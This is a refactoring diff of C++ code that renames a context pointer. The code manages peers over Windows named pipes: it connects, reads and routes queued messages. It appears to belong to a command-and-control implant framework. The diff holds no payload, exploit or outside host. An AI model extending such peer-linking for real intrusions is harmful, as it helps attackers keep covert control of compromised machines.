@@ -17,7 +17,7 @@ namespace Peers {
     _pipe_data* GetPeer(const uint32_t peer_id) {
         HEXANE;
 
-        auto head = Ctx->peers;
+        auto head = ctx->peers;
         do {
             if (head) {
                 if (head->peer_id == peer_id) {
@@ -36,7 +36,7 @@ namespace Peers {
         HEXANE;
 
         bool success    = true;
-        _pipe_data *head   = Ctx->peers;
+        _pipe_data *head   = ctx->peers;
         _pipe_data *target = GetPeer(peer_id);
         _pipe_data *prev   = { };
 
@@ -50,7 +50,7 @@ namespace Peers {
                     prev->next = head->next;
                 }
                 else {
-                    Ctx->peers = head->next;
+                    ctx->peers = head->next;
                 }
 
                 if (head->pipe_name) {
@@ -58,7 +58,7 @@ namespace Peers {
                     Free(head->pipe_name);
                 }
                 if (head->pipe_handle) {
-                    Ctx->nt.NtClose(head->pipe_handle);
+                    ctx->nt.NtClose(head->pipe_handle);
                     head->pipe_handle = nullptr;
                 }
 
@@ -88,28 +88,28 @@ namespace Peers {
         DWORD read  = 0;
 
         // first contact
-        if (!(handle = Ctx->win32.CreateFileW(pipe_name, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
+        if (!(handle = ctx->win32.CreateFileW(pipe_name, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
             if (handle == INVALID_HANDLE_VALUE) {
                 return false;
             }
 
             if (ntstatus == ERROR_PIPE_BUSY) {
-                if (!Ctx->win32.WaitNamedPipeW(pipe_name, 5000)) {
-                    Ctx->nt.NtClose(handle);
+                if (!ctx->win32.WaitNamedPipeW(pipe_name, 5000)) {
+                    ctx->nt.NtClose(handle);
                     return false;
                 }
             }
         }
 
         do {
-            if (Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &total, nullptr)) {
+            if (ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &total, nullptr)) {
                 if (total) {
 
                     in = CreateStream();
                     buffer = Malloc(total);
 
-                    if (!Ctx->win32.ReadFile(handle, buffer, total, &read, nullptr) || read != total) {
-                        Ctx->nt.NtClose(handle);
+                    if (!ctx->win32.ReadFile(handle, buffer, total, &read, nullptr) || read != total) {
+                        ctx->nt.NtClose(handle);
                         return false;
                     }
 
@@ -129,11 +129,11 @@ namespace Peers {
         MemCopy(&peer->peer_id, &peer_id, sizeof(uint32_t));
         MemCopy(peer->pipe_name, pipe_name, WcsLength(pipe_name) * sizeof(wchar_t));
 
-        if (!Ctx->peers) {
-            Ctx->peers = peer;
+        if (!ctx->peers) {
+            ctx->peers = peer;
         }
         else {
-            head = Ctx->peers;
+            head = ctx->peers;
             do {
                 if (head) {
                     if (head->next) {
@@ -165,12 +165,12 @@ namespace Peers {
         DWORD read  = 0;
         DWORD total  = 0;
 
-        for (auto client = Ctx->peers; client; client = client->next) {
-            if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, &bound, sizeof(uint8_t), nullptr, &read, nullptr) || read != sizeof(uint8_t)) {
+        for (auto client = ctx->peers; client; client = client->next) {
+            if (!ctx->win32.PeekNamedPipe(client->pipe_handle, &bound, sizeof(uint8_t), nullptr, &read, nullptr) || read != sizeof(uint8_t)) {
                 continue;
             }
 
-            if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, nullptr, 0, nullptr, &total, nullptr)) {
+            if (!ctx->win32.PeekNamedPipe(client->pipe_handle, nullptr, 0, nullptr, &total, nullptr)) {
                 continue;
             }
 
@@ -178,7 +178,7 @@ namespace Peers {
                 in = CreateStream();
                 buffer = Malloc(total);
 
-                if (!Ctx->win32.ReadFile(client->pipe_handle, buffer, total, &read, nullptr) || read != total) {
+                if (!ctx->win32.ReadFile(client->pipe_handle, buffer, total, &read, nullptr) || read != total) {
                     DestroyStream(in);
                     Free(buffer);
 
@@ -195,7 +195,7 @@ namespace Peers {
             }
 
         	// TODO: prepend outbound messages with 0, inbound with 1 (questioning if this is necessary)
-            for (auto message = Ctx->transport.message_queue; message; message = message->next) {
+            for (auto message = ctx->transport.message_queue; message; message = message->next) {
                 if (message->buffer && B_PTR(message->buffer)[0] == INGRESS) {
 
                     if (PeekPeerId(message) == client->peer_id) {
